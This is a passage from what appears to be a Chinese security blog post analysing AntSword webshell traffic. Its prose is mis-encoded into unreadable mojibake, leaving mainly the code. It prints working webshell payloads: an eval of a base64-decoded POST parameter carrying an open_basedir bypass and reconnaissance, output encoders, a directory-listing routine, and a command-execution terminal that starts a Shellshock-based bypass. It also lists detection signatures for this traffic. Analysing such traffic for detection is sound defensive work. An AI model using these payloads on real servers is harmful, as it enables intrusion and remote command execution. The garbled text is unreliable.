punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// è¾“å‡ºå°è£…åçš„æ•°æ®</span><span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•è¿æ¥çš„æ•°æ®åŒ…ä¸­ä½¿ç”¨äº† <code>$D = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</code> è·å–å½“å‰ç›®å½•ã€ä½¿ç”¨ <code>php_uname</code> è·å–å½“å‰æ“ä½œç³»ç»Ÿä¿¡æ¯ã€ä½¿ç”¨ <code>posix_getegid</code> æˆ– <code>get_current_user</code> è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯</p><p>è¾“å…¥åˆ°ç¼“å†²åŒºå†ç”± $output å˜é‡æ¥æ”¶ï¼Œé€šè¿‡<strong>éšæœºå­—ç¬¦</strong>ä½œä¸ºå¼€å§‹ç»“æŸç¬¦å®šä½å˜é‡è¾“å‡ºä½ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šå­—ç¬¦ç•Œå®šï¼š</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202161209842.png"></p><hr><h3 id="base64-æµé‡"><a href="#base64-æµé‡" class="headerlink" title="base64 æµé‡"></a>base64 æµé‡</h3><p>è¯·æ±‚çš„æµé‡ url è§£ç åå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ib1723d0358b9'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>ib1723d0358b9<span class="token operator">=</span>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmM3OWUyYSI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9JHRtZGlyPXJlYWxwYXRoKCR0bWRpcik7QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiAkb3V0O307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIjAwOCIuIjk1NmQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImJkMGJkNiIuImU5NzZkMiI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk<span class="token operator">/</span>QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk<span class="token operator">/</span>JHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64 éƒ¨åˆ†è§£ç åå’Œ default ä¸€æ ·</p><p>å¯è§èšå‰‘ä¼šéšæœºç”Ÿæˆä¸€ä¸ªå‚æ•°ä¼ å…¥ base64 ç¼–ç åçš„ä»£ç ï¼Œå¯†ç å‚æ•°çš„å€¼æ˜¯é€šè¿‡ POST è·å–éšæœºå‚æ•°çš„å€¼ç„¶åè¿›è¡Œ base64 è§£ç åä½¿ç”¨ eval æ‰§è¡Œ</p><p>å¦‚æœæŠŠè§£ç å™¨è®¾ç½®ä¸º base64ï¼Œå“åº”åŒ…å†…å®¹ä¼šè¿›è¡Œ base64 ç¼–ç è¿”å›</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202161953791.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">c9a25acf7L3Zhci93d3cvaHRtbAkvCUxpbnV4IDllMjcyYmI1NzQ1OCA2LjEyLjU0LWxpbnV4a2l0ICMxIFNNUCBUdWUgTm92ICA0IDIxOjIxOjQ3IFVUQyAyMDI1IHg4Nl82NAl3d3ctZGF0YQ==52f7ba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å“åº”åŒ…ç›´æ¥ base64 è§£ä¸å¼€ï¼Œæ­¤æ—¶è§£ç ä¸€ä¸‹è¯·æ±‚åŒ…è§‚å¯Ÿä¸€ä¸‹åŠ å¯†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> @<span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"c9a2"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"5acf7"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"52f"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"7ba"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æœ€ç®€æ˜“çš„ base64_encodeï¼Œåªæ˜¯è¾“å‡ºç»“æœä¸­æºäº†å‰é¢çš„ç•Œå®šç¬¦ï¼Œåˆ å»ç•Œå®šç¬¦å³å¯è§£å‡ºæ­£ç¡®çš„è¾“å‡º</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">L3Zhci93d3cvaHRtbAkvCUxpbnV4IDllMjcyYmI1NzQ1OCA2LjEyLjU0LWxpbnV4a2l0ICMxIFNNUCBUdWUgTm92ICA0IDIxOjIxOjQ3IFVUQyAyMDI1IHg4Nl82NAl3d3ctZGF0YQ==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="chr-æµé‡"><a href="#chr-æµé‡" class="headerlink" title="chr æµé‡"></a>chr æµé‡</h3><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202163924626.png"></p><p>å¤§å°å†™ + ascii è¿‡ chr è¿”å›å­—ç¬¦</p><hr><h3 id="rot13-æµé‡"><a href="#rot13-æµé‡" class="headerlink" title="rot13 æµé‡"></a>rot13 æµé‡</h3><p>è¿™é‡Œç¼–è§£ç å‡é€‰æ‹© rot13</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202164046166.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"487de"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"a8be0"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"5ccf"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"21b31"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h2><p>æµ‹è¯•æµé‡ä¸­çš„æ•°æ®åŒ…éƒ½æ˜¯é‡‡ç”¨ <code>@ini_set</code> å‡½æ•°å¼€å¤´ï¼Œåœ¨ base64 æ•°æ®åŒ…ä¸­å®ƒæ˜¯ <code>QGluaV9zZXQ</code>ï¼Œåœ¨ chr ç¼–ç æ•°æ®åŒ…ä¸­æ˜¯ <code>cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116)</code>ï¼Œåœ¨ rot13 ç¼–ç æ•°æ®åŒ…ä¸­æ˜¯ <code>@vav_frg</code>  å¹¶ä¸”ç¼–ç åçš„æ•°æ®åŒ…ä¸­éƒ½å­˜åœ¨ eval è¿™ä¸ªæ•æ„Ÿå‡½æ•°</p><hr><h2 id="åŠŸèƒ½å®ç°"><a href="#åŠŸèƒ½å®ç°" class="headerlink" title="åŠŸèƒ½å®ç°"></a>åŠŸèƒ½å®ç°</h2><p>æ¥éƒ½æ¥äº†ï¼Œå†çœ‹çœ‹èšå‰‘çš„åŠŸèƒ½å®ç°</p><h3 id="æ–‡ä»¶ç®¡ç†"><a href="#æ–‡ä»¶ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç®¡ç†"></a>æ–‡ä»¶ç®¡ç†</h3><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202165907120.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p4cb5f917cc47d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR:// Path Not Found Or No Permission!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$M</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token variable">$L</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$N</span> <span class="token operator">=</span> @<span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$P</span> <span class="token operator">=</span> <span class="token variable">$D</span> <span class="token operator">.</span> <span class="token variable">$N</span><span class="token punctuation">;</span>            <span class="token variable">$T</span> <span class="token operator">=</span> @<span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> @<span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token variable">$E</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span>@<span class="token function">fileperms</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$R</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> <span class="token variable">$T</span> <span class="token operator">.</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> @<span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> <span class="token variable">$E</span> <span class="token operator">.</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$M</span> <span class="token operator">.=</span> <span class="token variable">$N</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$R</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$L</span> <span class="token operator">.=</span> <span class="token variable">$N</span> <span class="token operator">.</span> <span class="token variable">$R</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$M</span> <span class="token operator">.</span> <span class="token variable">$L</span><span class="token punctuation">;</span>        @<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œçš„ <code>base64_decode(substr($_POST[&quot;p4cb5f917cc47d&quot;], 2))</code>ï¼Œæ˜¯ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹è¿›è¡Œ base64 è§£ç çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹äºè¿™é‡Œçš„ <code>IML3Zhci93d3cvaHRtbC8%3D</code>ï¼Œ$D å®é™…çš„å‚æ•°å€¼æ˜¯ <code>/var/www/html/</code></p><hr><h3 id="webshell-ç»ˆç«¯"><a href="#webshell-ç»ˆç«¯" class="headerlink" title="webshell ç»ˆç«¯"></a>webshell ç»ˆç«¯</h3><p>æœ¬è´¨ä¸Šè¿˜æ˜¯åˆ©ç”¨ php çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„ shellï¼Œåªæ˜¯ç»“æœæ›´æ˜“è¯»äº†</p><p>åœ¨ &#x2F;var&#x2F;www&#x2F;html ä¸‹æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œ ls</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202171425784.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ä»POSTå‚æ•°è§£ç å‘½ä»¤å’Œå‚æ•°</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"i90659ac15e848"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ä¸»å‘½ä»¤/ç¨‹åº</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"s34a4100eb3bde"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// å‘½ä»¤å‚æ•°</span>    <span class="token variable">$envstr</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"f01dc94a142fc6"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ç¯å¢ƒå˜é‡</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ ¹æ®æ“ä½œç³»ç»Ÿè®¾ç½®ä¸åŒçš„å‘½ä»¤è¡Œå‚æ•°æ ¼å¼</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"-c \"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>\""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"/c \"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®ç³»ç»ŸPATHç¯å¢ƒå˜é‡ï¼Œç¡®ä¿å¯ä»¥æ‰¾åˆ°å¸¸ç”¨å‘½ä»¤</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Linuxç³»ç»Ÿï¼šæ·»åŠ å¸¸ç”¨äºŒè¿›åˆ¶ç›®å½•</span>        @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windowsç³»ç»Ÿï¼šæ·»åŠ ç³»ç»Ÿç›®å½•</span>        @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// å¤„ç†é¢å¤–çš„ç¯å¢ƒå˜é‡</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$envstr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$envarr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|||asline|||"</span><span class="token punctuation">,</span> <span class="token variable">$envstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$envarr</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|||askey|||"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// ç»„åˆå®Œæ•´çš„å‘½ä»¤</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token punctuation">&#125;</span></span> <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$c</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token comment">// æ£€æŸ¥å‡½æ•°æ˜¯å¦å¯ç”¨ï¼ˆæ˜¯å¦è¢«ç¦ç”¨ï¼‰</span>    <span class="token keyword">function</span> <span class="token function-definition function">fe</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'trim'</span><span class="token punctuation">,</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'strtolower'</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// å°è¯•åˆ©ç”¨Shellshockæ¼æ´æ‰§è¡Œå‘½ä»¤</span>    <span class="token keyword">function</span> <span class="token function-definition function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'putenv'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 